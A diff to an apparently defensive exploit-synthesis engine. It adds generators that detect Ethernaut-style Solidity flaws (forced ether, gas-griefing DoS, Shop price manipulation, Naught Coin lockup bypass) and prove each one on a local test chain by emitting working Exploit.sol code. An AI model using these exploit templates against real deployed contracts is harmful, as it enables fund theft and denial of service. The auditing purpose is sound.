@@ -2377,6 +2377,377 @@ def _synth_callback_inconsistency(name, target_src, invariants_src, manifest, sc
     return None
 
 
+def _synth_force(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Force 류: receive/fallback/payable 이 전혀 없는 '받을 수 없는' 컨트랙트에
+    selfdestruct 로 ETH 를 강제 주입한다. 잔액이 0 에서 양수로 바뀌는지로 증명한다.
+    오탐 억제: 외부 상태변경 함수가 없는 inert 컨트랙트일 때만 발화(Force 원형)."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if re.search(r"\breceive\s*\(|\bfallback\s*\(|\bpayable\b", tb):
+        return None
+    # inert: 외부/public 함수가 없어야(있으면 다른 계열이 담당)
+    if any(fn["external"] for fn in _functions(tb)):
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    pwn_src = (HEADER + "contract Pwn {\n"
+               "    constructor(address t) payable { selfdestruct(payable(t)); }\n}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try:
+        compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception:
+        return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Pwn" not in arts:
+        return None
+    w3, acct = _mk_evm()
+    def deploy(cn, args, value=0):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"value":value,"gas":6_000_000})).contractAddress
+    try:
+        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(arts[name]["abi"])])
+    except Exception:
+        return None
+    if w3.eth.get_balance(taddr) != 0:
+        return None
+    amt = 10**18
+    try:
+        deploy("Pwn", [Web3.to_checksum_address(taddr)], value=amt)
+    except Exception:
+        return None
+    if w3.eth.get_balance(taddr) <= 0:
+        return None
+    poc = (HEADER +
+        "// Strategy: forced ether (Ethernaut Force). The target cannot receive ETH\n"
+        "// (no receive/fallback/payable), so we selfdestruct a funded contract into it.\n"
+        "contract Exploit {\n"
+        "    function run(address t) external payable { new Bomb{value: msg.value}(t); }\n"
+        "}\n"
+        "contract Bomb { constructor(address t) payable { selfdestruct(payable(t)); } }\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (force)","strategy":"force","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":"forced ether balance (0 → positive)",
+            "strategy":"force:selfdestruct","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "balance_before_wei":"0","balance_after_wei":str(w3.eth.get_balance(taddr)),
+            "note":"selfdestruct 로 받을 수 없는 컨트랙트에 ETH 를 강제 주입했습니다(balance 0→+).",
+            "ms":int((time.time()-t0)*1000)}
+
+
+def _synth_gas_griefing(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Denial 류: 설정 가능한 수신자에게 가스 한도 없이 .call 로 송금한 뒤
+    같은 함수에서 추가 상태전이가 이어지는 구조. 공격자가 수신자로 등록되어 콜백에서
+    가스를 전량 소진하면(63/64 규칙), 남은 가스로 뒤 코드가 실패해 함수 전체가 revert →
+    정상 인출이 DoS 된다. 베이스라인(EOA 수신자)은 성공하지만 공격 후 revert 로 증명."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # 수신자 상태변수를 설정하는 public setter + 그 변수로 .call{value:}
+    setter = None; recip = None
+    for fn in _functions(tb):
+        m = re.search(r"(\w+)\s*=\s*(?:_?\w+)\s*;", fn["body"])
+        # setter: 파라미터를 상태변수에 대입
+        if fn["external"] and fn["args"]:
+            for a in fn["args"]:
+                mm = re.search(r"(\w+)\s*=\s*" + re.escape(a[1]) + r"\s*;", fn["body"])
+                if mm:
+                    setter = fn["name"]; recip = mm.group(1); break
+        if setter:
+            break
+    if not setter or not recip:
+        return None
+    # recip 로 가스무제한 .call{value:} 하고, 그 뒤 추가 코드(transfer/sstore)가 있는 함수
+    drain = None
+    for fn in _functions(tb):
+        b = fn["body"]
+        cm = re.search(re.escape(recip) + r"\s*\.\s*call\s*\{\s*value", b)
+        if cm and fn["external"] and not fn["args"]:
+            # .call 이후 잔여 코드가 있어야(가스 소진 시 revert 유발)
+            if len(b) - cm.end() > 20:
+                drain = fn["name"]; break
+    if not drain:
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    pwn_src = (HEADER + "contract Pwn {\n"
+               "    receive() external payable { while (true) {} }\n}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try:
+        compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception:
+        return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Pwn" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts)
+    if len(accts) < 3:
+        return None
+    def deploy(cn, args, value=0, frm=None):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":frm or acct,"value":value,"gas":6_000_000})).contractAddress
+    try:
+        seed = 10**18 if _ctor_payable(abi) else 0
+        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)], value=seed)
+    except Exception:
+        return None
+    if seed == 0:
+        try: w3.eth.send_transaction({"from":accts[-1],"to":taddr,"value":10**18,"gas":200000})
+        except Exception: pass
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    GAS = 150000
+    def _ok(txh):
+        try: return int(w3.eth.wait_for_transaction_receipt(txh).status) == 1
+        except Exception: return False
+    tester = w3.provider.ethereum_tester; snap = tester.take_snapshot()
+    # 베이스라인: 수신자를 EOA 로 두면 withdraw 성공해야 함
+    try:
+        getattr(tc.functions, setter)(accts[2]).transact({"from":acct,"gas":200000})
+        base_ok = _ok(getattr(tc.functions, drain)().transact({"from":acct,"gas":GAS}))
+    except Exception:
+        base_ok = False
+    tester.revert_to_snapshot(snap)
+    if not base_ok:
+        return None
+    # 공격: 수신자를 가스 소진 컨트랙트로 → withdraw 가 revert 해야 함
+    try:
+        paddr = deploy("Pwn", [])
+        getattr(tc.functions, setter)(paddr).transact({"from":acct,"gas":200000})
+    except Exception:
+        return None
+    blocked = not _ok(getattr(tc.functions, drain)().transact({"from":acct,"gas":GAS}))
+    if not blocked:
+        return None
+    poc = (HEADER +
+        "// Strategy: gas-griefing DoS (Ethernaut Denial). Register an attacker as the\n"
+        f"// call recipient in {setter}(); its receive() burns all forwarded gas so\n"
+        f"// {drain}() runs out of gas after the call and reverts — a permanent DoS.\n"
+        f"interface IT {{ function {setter}(address) external; }}\n"
+        "contract Exploit {\n"
+        f"    function run(address t) external payable {{ IT(t).{setter}(address(this)); }}\n"
+        "    receive() external payable { while (true) {} }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (gas-griefing)","strategy":"gas-griefing","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{drain}() DoS via gas griefing",
+            "strategy":f"gas-griefing:{drain}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"설정 가능한 수신자에게 가스 무제한 call → 콜백에서 가스 소진 → 함수 전체 revert(DoS).",
+            "ms":int((time.time()-t0)*1000)}
+
+
+def _synth_shop(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Shop 류: 외부 인터페이스의 view 함수(price())를 한 함수에서 두 번 호출해
+    분기·상태전이를 결정. 공격자가 타깃 자신의 상태(isSold 등)를 읽어 첫 호출은 크게,
+    둘째 호출은 작게 반환하면 정직한 구현으로는 불가능한 상태(price 하락)를 만든다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # view uint 반환 인터페이스 메서드
+    cand = []
+    for im in re.finditer(r"interface\s+(\w+)\s*\{([^}]*)\}", strip):
+        iname, ibody = im.group(1), im.group(2)
+        fm = re.search(r"function\s+(\w+)\s*\(\s*\)[^;]*\breturns\s*\(\s*(?:uint\d*)", ibody)
+        if fm:
+            cand.append((iname, fm.group(1)))
+    for iname, mname in cand:
+        if not re.search(re.escape(iname) + r"\s*\(\s*msg\.sender\s*\)", tb):
+            continue
+        f = None; flagvar = None; pricevar = None
+        for fn in _functions(tb):
+            b = fn["body"]
+            if re.search(re.escape(iname) + r"\s*\(\s*msg\.sender\s*\)", b) \
+                    and len(re.findall(r"\.\s*" + re.escape(mname) + r"\s*\(", b)) >= 2:
+                pm = re.search(r"(\w+)\s*=\s*[\w.]*\.\s*" + re.escape(mname) + r"\s*\(", b)
+                fm2 = re.search(r"(\w+)\s*=\s*true", b)
+                if pm:
+                    f = fn["name"]; pricevar = pm.group(1); flagvar = fm2.group(1) if fm2 else None
+                    break
+        if not f or not pricevar:
+            continue
+        _solcv, _evm = _solc_for(target_src)
+        # 컴파일해 타깃 ABI/게터 확인
+        std0 = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+                "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi"]}}}}
+        try: c0 = solcx.compile_standard(std0, allow_empty=True)
+        except Exception: return None
+        tabi = None
+        for _fl, cs in c0.get("contracts", {}).items():
+            for cn, c in cs.items():
+                if cn == name: tabi = c["abi"]
+        if tabi is None or not _has_getter(tabi, pricevar):
+            continue
+        gate = flagvar if (flagvar and _has_getter(tabi, flagvar)) else None
+        cond = (f"IS(shop).{gate}() ? 1 : 100") if gate else "sold ? 1 : 100"
+        pwn_src = (HEADER +
+            f"interface IS {{ function {f}() external; function {pricevar}() external view returns (uint256);"
+            + (f" function {gate}() external view returns (bool);" if gate else "") + " }\n"
+            "contract Pwn {\n"
+            "    address shop; bool sold;\n"
+            f"    function run(address t) external {{ shop = t; IS(t).{f}(); }}\n"
+            f"    function {mname}() external view returns (uint256) {{ return {cond}; }}\n"
+            "}\n")
+        std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+               "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+        try: compiled = solcx.compile_standard(std, allow_empty=True)
+        except Exception: continue
+        arts = {}
+        for _fl, cs in compiled.get("contracts", {}).items():
+            for cn, c in cs.items():
+                arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+        if name not in arts or "Pwn" not in arts:
+            continue
+        abi = arts[name]["abi"]
+        w3, acct = _mk_evm()
+        def deploy(cn, args):
+            C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+            return w3.eth.wait_for_transaction_receipt(
+                C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
+        try:
+            taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
+            paddr = deploy("Pwn", [])
+        except Exception:
+            continue
+        tc = w3.eth.contract(address=taddr, abi=abi)
+        try: p0 = int(tc.functions[pricevar]().call())
+        except Exception: continue
+        pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
+        try:
+            pwn.functions.run(taddr).transact({"from":acct,"gas":3_000_000})
+        except Exception:
+            continue
+        try: p1 = int(tc.functions[pricevar]().call())
+        except Exception: continue
+        if not (p1 < p0):
+            continue
+        poc = (HEADER +
+            "// Strategy: view-callback inconsistency (Ethernaut Shop). buy() reads price()\n"
+            "// twice; the attacker returns a high price on the gating read and a low price\n"
+            "// on the committing read (by reading the shop's own state).\n"
+            f"interface IS {{ function {f}() external; function {(gate or pricevar)}() external view returns ({'bool' if gate else 'uint256'}); }}\n"
+            "contract Exploit {\n"
+            "    address shop;\n"
+            f"    function run(address t) external {{ shop = t; IS(t).{f}(); }}\n"
+            f"    function {mname}() external view returns (uint256) {{ return {cond}; }}\n"
+            "}\n")
+        gen = {"step":"generate","title":"Exploit.sol 생성 (shop)","strategy":"shop","exploit_src":poc}
+        return {"name":name,"proven":True,"firstViolated":f"'{pricevar}' manipulated via view-callback ({p0}→{p1})",
+                "strategy":f"shop:{f}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+                "note":"view 콜백을 두 번 신뢰하는 분기를 조작해 상태(price)를 불가능한 값으로 낮췄습니다.",
+                "ms":int((time.time()-t0)*1000)}
+    return None
+
+
+def _synth_lockup_bypass(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Naught Coin 류: transfer() 는 락업(modifier/require)인데 transferFrom() 은
+    무방비인 ERC20. 소유자(player)가 approve+transferFrom 으로 락업을 우회해 전량 이전한다.
+    직접 transfer 는 revert 하지만 transferFrom 은 성립해 잔액이 0 이 되는지로 증명."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    fns = {fn["name"]: fn for fn in _functions(tb)}
+    if not ({"transfer","transferFrom","approve","balanceOf"} & set(fns.keys()) or "balanceOf" in tb):
+        return None
+    if "transfer" not in fns or "transferFrom" not in fns:
+        return None
+    thead = fns["transfer"]["head"] + fns["transfer"]["body"]
+    fhead = fns["transferFrom"]["head"] + fns["transferFrom"]["body"]
+    locked_transfer = bool(re.search(r"lock|timeLock|block\.timestamp|require\([^)]*time", thead, re.I)) \
+        or bool(re.search(r"\b(lockTokens|onlyAfter|whenUnlocked)\b", fns["transfer"]["head"]))
+    locked_ff = bool(re.search(r"lock|timeLock|block\.timestamp|require\([^)]*time", fhead, re.I)) \
+        or bool(re.search(r"\b(lockTokens|onlyAfter|whenUnlocked)\b", fns["transferFrom"]["head"]))
+    if not (locked_transfer and not locked_ff):
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts)
+    # player 를 attacker(acct) 로 배포(생성자 address 인자에 acct 주입)
+    ctypes = _abi_ctor_types(abi)
+    cargs = [Web3.to_checksum_address(acct) if t == "address" else _default_for_type(t) for t in ctypes]
+    def deploy(cn, args):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
+    try:
+        taddr = deploy(name, cargs)
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    try:
+        bal0 = int(tc.functions.balanceOf(acct).call())
+    except Exception:
+        return None
+    if bal0 <= 0:
+        return None
+    def _ok(txh):
+        try: return int(w3.eth.wait_for_transaction_receipt(txh).status) == 1
+        except Exception: return False
+    # 직접 transfer 는 락업으로 실패해야(정탐 조건)
+    direct_blocked = not _ok(tc.functions.transfer(accts[-1], bal0).transact({"from":acct,"gas":200000}))
+    if not direct_blocked:
+        return None
+    # approve + transferFrom 으로 우회 이전
+    try:
+        tc.functions.approve(acct, bal0).transact({"from":acct,"gas":200000})
+        moved = _ok(tc.functions.transferFrom(acct, accts[-1], bal0).transact({"from":acct,"gas":300000}))
+    except Exception:
+        return None
+    if not moved or int(tc.functions.balanceOf(acct).call()) != 0:
+        return None
+    poc = (HEADER +
+        "// Strategy: lockup bypass (Ethernaut Naught Coin). transfer() is time-locked for\n"
+        "// the player, but transferFrom() is not — approve() then transferFrom() moves the\n"
+        "// full balance out, bypassing the lock.\n"
+        "interface IT {\n"
+        "    function balanceOf(address) external view returns (uint256);\n"
+        "    function approve(address,uint256) external returns (bool);\n"
+        "    function transferFrom(address,address,uint256) external returns (bool);\n"
+        "}\n"
+        "contract Exploit {\n"
+        "    function run(address t) external payable {\n"
+        "        uint256 bal = IT(t).balanceOf(msg.sender);\n"
+        "        // player calls: IT(t).approve(address(this), bal); then this pulls it out\n"
+        "        IT(t).transferFrom(msg.sender, address(0xdead), bal);\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (lockup-bypass)","strategy":"lockup-bypass","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":"transfer lockup bypassed via transferFrom (balance → 0)",
+            "strategy":"lockup-bypass:transferFrom","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"transfer 는 락업이지만 transferFrom 이 무방비라 approve+transferFrom 으로 전량 이전했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
     """다중 블록 러너: 블록 엔트로피로 결과가 정해지는 게임(예: CoinFlip)에서,
     소스의 결과식을 복제한 공격 컨트랙트를 배포하고 블록을 넘기며 매 블록 올바른
@@ -2743,6 +3114,34 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0j) view 콜백 불일치 (예: Shop — price() 두 번 신뢰)
+    try:
+        r = _synth_shop(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0k) 락업 우회 (예: Naught Coin — transfer 락업, transferFrom 무방비)
+    try:
+        r = _synth_lockup_bypass(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0l) 가스 그리핑 DoS (예: Denial — 수신자 콜백 가스 소진)
+    try:
+        r = _synth_gas_griefing(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0m) 강제 ETH 주입 (예: Force — receive 없는 inert 컨트랙트)
+    try:
+        r = _synth_force(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 1) 호출 시퀀스 탐색
     try:
         found=_fuzz_search(name, target_src, invariants_src, manifest, do_verify)
@@ -2806,7 +3205,8 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
     # 2b) 합성 단계 — 실행으로 소스를 확정하는 단일 결과형 생성기
     inv = invariants_src if do_verify else None
     for fn in (_storage_attempt, _proxy_attempt, _multiblock_attempt,
-               _synth_storage_collision, _synth_king_dos, _synth_callback_inconsistency):
+               _synth_storage_collision, _synth_king_dos, _synth_callback_inconsistency,
+               _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
